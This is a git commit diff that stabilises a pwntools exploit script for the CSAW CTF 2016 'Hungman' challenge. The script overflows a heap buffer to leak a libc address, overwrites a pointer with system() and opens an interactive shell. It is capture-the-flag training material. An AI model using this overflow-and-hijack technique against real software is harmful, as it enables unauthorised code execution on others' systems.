532b5eb80c159a36797819425d14a7765523e121
Naetw <wangzhelee.cs04@g2.nctu.edu.tw>
2017-03-30 22:32:43 +0800

    Repair exploit to make it stable

--- CSAW-CTF-2016/Hungman/ex.py
+++ CSAW-CTF-2016/Hungman/ex.py
@@ -2,65 +2,58 @@
 
 from pwn import *
 
-r = remote('127.0.0.1', 4000)
+#context.log_level = 'DEBUG'
+r = process('./hungman-patch')
+#r = remote('172.17.0.2', 4000)
 #r = remote('pwn.chal.csaw.io', 8003)
+
+libc = ELF('bc.so.6')
+#libc =ELF('/home/naetw/heapdebug/src/glibc-2.19/32/lib/libc.so.6')
+#libc =ELF('/home/naetw/heapdebug/src/glibc-2.19/64/lib/libc.so.6')
 
 libc_start_got = 0x602068
 
-delay = 0.1
-sleep(delay)
+r.recv()
 r.sendline('A'*26)
-sleep(delay)
 
 def game(payload):
-    for i in range(26):
+    for i in xrange(26):
         r.sendline(chr(97+i))
-        x = r.recvrepeat(delay)
+        x = r.recvline()
         if x[0:4] == "High":
+            r.recv(timeout=3)
             r.sendline('y')
+            sleep(1)
             r.sendline(payload)
-            break
+            return
         if x[0:4] == 'Defa':
-            r.recvrepeat(delay)
+            r.recvuntil('Continue? ')
             r.sendline('y')
             i = 0
-            r.recvrepeat(delay)
+            r.recvline()
 
-payload = ""
-payload += 'A'*32
+# leak libc function address
+payload = 'A'*32
 payload += p64(0) + p64(0x91) + p32(0x20) + p32(0x1b) + p64(libc_start_got)
-
+r.recvuntil('__________________________\n')
 game(payload)
-
-r.recvuntil('player:')
-x = r.recvuntil('score:')
-r.recvrepeat(delay)
-libc_start = x[1:7]
-libc_start += '\x00'*2
-libc_start = u64(libc_start)
-print hex(libc_start)
-
-#libc = ELF('libc-2.23.so')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-libc_start_off = libc.symbols['__libc_start_main']
-base = libc_start - libc_start_off
+r.recvuntil('player: ')
+x = r.recvuntil(' score:')
+r.recv()
+base = u64(x[0:6] + '\x00' * 2) - libc.symbols['__libc_start_main']
 system = base + libc.symbols['system']
+info('libc base : {}'.format(hex(base)))
+info('system : {}'.format(hex(system)))
 
-libc_start_main = base + libc_start_off
-
-print hex(base)
-
+# hijack memcpy() and open shell
 r.sendline('y')
-
-payload = ""
-payload += 'sh\x00'.ljust(8) + 'A'*8 + p64(system) + p64(base + libc.symbols['malloc']) 
+r.recvuntil('__________________________\n')
+payload = 'sh\x00'.ljust(8) + 'A'*8 + p64(system) + p64(base + libc.symbols['malloc']) 
 game(payload)
-
-r.recvrepeat(delay)
+r.recvuntil('Continue? ')
 r.sendline('y')
-r.recvrepeat(delay)
-payload = "sh\x00"
+r.recvline()
+payload = 'whatever'
 game(payload)
 
 r.interactive()
